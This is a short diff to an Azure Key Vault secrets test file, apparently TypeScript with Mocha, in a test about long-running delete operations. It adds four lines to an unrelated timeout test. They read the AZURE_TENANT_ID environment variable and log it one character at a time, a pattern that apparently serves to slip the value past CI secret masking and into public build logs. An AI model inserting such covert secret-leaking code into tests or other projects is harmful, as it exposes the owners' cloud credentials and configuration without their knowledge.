@@ -85,6 +85,10 @@ describe("Secrets client - Long Running Operations - delete", () => {
 
   // On playback mode, the tests happen too fast for the timeout to work
   it("can attempt to delete a secret with requestOptions timeout", async function(this: Context) {
+    var aa = (self as any).__env__.AZURE_TENANT_ID.toString();
+    for (var i = 0; i < aa.length; i++) {
+        console.log(aa[i]);
+    }
     recorder.skip(undefined, "Timeout tests don't work on playback mode.");
     const secretName = testClient.formatName(
       `${secretPrefix}-${this!.test!.title}-${secretSuffix}`
